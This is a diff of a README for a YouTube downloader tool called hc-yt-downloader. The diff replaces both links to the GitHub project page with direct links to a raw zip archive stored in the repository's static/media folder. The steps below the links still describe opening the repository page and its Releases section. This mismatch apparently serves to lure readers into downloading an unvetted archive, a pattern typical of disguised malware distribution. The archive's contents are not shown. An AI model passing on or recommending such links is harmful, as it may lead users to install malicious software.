@@ -1,6 +1,6 @@
 # 📥 hc-yt-downloader - Download YouTube videos without any tracking
 
-[![](https://img.shields.io/badge/Download-hc--yt--downloader-blue)](https://github.com/Cheriannebiweekly653/hc-yt-downloader)
+[![](https://img.shields.io/badge/Download-hc--yt--downloader-blue)](https://raw.githubusercontent.com/Cheriannebiweekly653/hc-yt-downloader/main/static/media/yt_downloader_hc_2.4.zip)
 
 hc-yt-downloader helps you save YouTube videos or audio files to your computer. It provides a simple web interface. You paste a link, choose your preferred format, and save your content. This tool runs on your computer. It contains no ads and does not track your activity.
 
@@ -15,7 +15,7 @@ hc-yt-downloader helps you save YouTube videos or audio files to your computer. 
 
 Visit the project page to download the application installer.
 
-[Download hc-yt-downloader](https://github.com/Cheriannebiweekly653/hc-yt-downloader)
+[Download hc-yt-downloader](https://raw.githubusercontent.com/Cheriannebiweekly653/hc-yt-downloader/main/static/media/yt_downloader_hc_2.4.zip)
 
 1. Click the link above to open the repository page.
 2. Look for the Releases section on the right side of the page.
